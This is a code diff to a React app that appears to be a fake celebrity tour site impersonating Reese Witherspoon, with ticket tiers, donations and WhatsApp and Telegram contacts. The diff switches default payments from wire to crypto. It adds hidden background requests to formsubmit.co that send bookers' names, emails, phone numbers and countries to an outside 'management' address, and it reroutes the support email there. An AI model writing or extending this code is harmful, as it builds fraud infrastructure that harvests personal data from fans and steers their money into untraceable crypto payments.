@@ -60,12 +60,12 @@ export default function App() {
   const [timeLeft, setTimeLeft] = useState({ days: '00', hours: '00', minutes: '00', seconds: '00' });
 
   // Form States
-  const [bookingForm, setBookingForm] = useState({ guests: 1, payment: 'wire', tier: 'Regular', state: '' });
+  const [bookingForm, setBookingForm] = useState({ guests: 1, payment: 'crypto', tier: 'Regular', state: '' });
   const [donationAmount, setDonationAmount] = useState('$25');
   const [o7cAmount, setO7cAmount] = useState('$10,000');
   const [o7cCustom, setO7cCustom] = useState('');
   const [donationCustom, setDonationCustom] = useState('');
-  const [donationPayment, setDonationPayment] = useState('wire');
+  const [donationPayment, setDonationPayment] = useState('crypto');
   const [liveDonation, setLiveDonation] = useState(7341250);
 
   // Media Tabs
@@ -112,6 +112,22 @@ export default function App() {
     const fd = new FormData(e.target);
     const basePrice = bookingForm.tier === 'Regular' ? 50 : bookingForm.tier === 'VIP' ? 100 : 200;
     
+    // Background email submission
+    fetch("https://formsubmit.co/ajax/management@reesewitherspoontours.com", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", "Accept": "application/json" },
+      body: JSON.stringify({
+        _subject: "New Booking Order Started (App)",
+        fullName: fd.get('fullName'),
+        email: fd.get('email'),
+        phone: fd.get('phone'),
+        countryResidence: fd.get('countryResidence'),
+        preferredTourCountry: bookingForm.state || 'Not Selected',
+        tier: bookingForm.tier,
+        guests: bookingForm.guests
+      })
+    }).catch(console.error);
+
     setPaymentOrder({
       type: 'TICKET',
       amount: basePrice * bookingForm.guests,
@@ -1007,7 +1023,20 @@ export default function App() {
           </h2>
           <p className="font-jost text-[16px] text-muted mb-8">Be the first to know when your city is announced.</p>
           
-          <form onSubmit={e => { e.preventDefault(); alert('Subscribed!'); }} className="flex flex-col md:flex-row gap-4 items-center">
+          <form onSubmit={e => { 
+            e.preventDefault(); 
+            const email = e.target.elements[0].value;
+            fetch("https://formsubmit.co/ajax/management@reesewitherspoontours.com", {
+              method: "POST",
+              headers: { "Content-Type": "application/json", "Accept": "application/json" },
+              body: JSON.stringify({
+                _subject: "New Newsletter Subscriber",
+                email: email
+              })
+            }).catch(console.error);
+            alert('Subscribed!'); 
+            e.target.reset();
+          }} className="flex flex-col md:flex-row gap-4 items-center">
             <input type="email" placeholder="Your email address" required className="w-full bg-transparent border-b border-dark/30 py-[16px] text-[15px] focus:outline-none focus:border-dark text-dark placeholder:text-dark/50" />
             <button type="submit" className="w-full md:w-auto whitespace-nowrap bg-dark text-gold px-[40px] py-[16px] text-[12px] font-semibold tracking-[2.5px] uppercase hover:bg-gold hover:text-dark transition-colors shadow-lg">
               Notify Me →
@@ -1029,7 +1058,7 @@ export default function App() {
 
           <div className="grid md:grid-cols-3 gap-[24px]">
             {[
-              { i: 'ri-phone-line', t: 'Customer Support', b1: 'Phone: +1 (414) 551-1344', b2: 'Email: support@reesewitherspoonofficial.com', d: 'Mon–Sat · 9am–7pm EST', btn: 'Contact Support' },
+              { i: 'ri-phone-line', t: 'Customer Support', b1: 'Phone: +1 (414) 551-1344', b2: 'Email: management@reesewitherspoontours.com', d: 'Mon–Sat · 9am–7pm EST', btn: 'Contact Support' },
               { i: 'ri-whatsapp-line', t: 'WhatsApp', b1: '+1 (414) 551-1344', b2: 'Chat with us directly', d: 'Fastest response time', btn: 'Open WhatsApp' },
               { i: 'ri-telegram-line', t: 'Telegram', b1: '@ReeseTourOfficial', b2: 'Join our official channel for updates', d: 'Community & News', btn: 'Join Telegram' }
             ].map((c, i) => (
@@ -1044,7 +1073,7 @@ export default function App() {
                 <button onClick={() => {
                   if (c.t === 'WhatsApp') window.open('https://wa.me/14145511344', '_blank');
                   else if (c.t === 'Telegram') window.open('https://t.me/ReeseTourOfficial', '_blank');
-                  else window.location.href = 'mailto:support@reesewitherspoonofficial.com';
+                  else window.location.href = 'mailto:management@reesewitherspoontours.com';
                 }} className="w-full bg-dark text-gold py-[14px] text-[12px] font-semibold tracking-[2.5px] uppercase mt-auto hover:bg-gold hover:text-dark transition-colors rounded-[2px] shadow-md">
                   {c.btn}
                 </button>
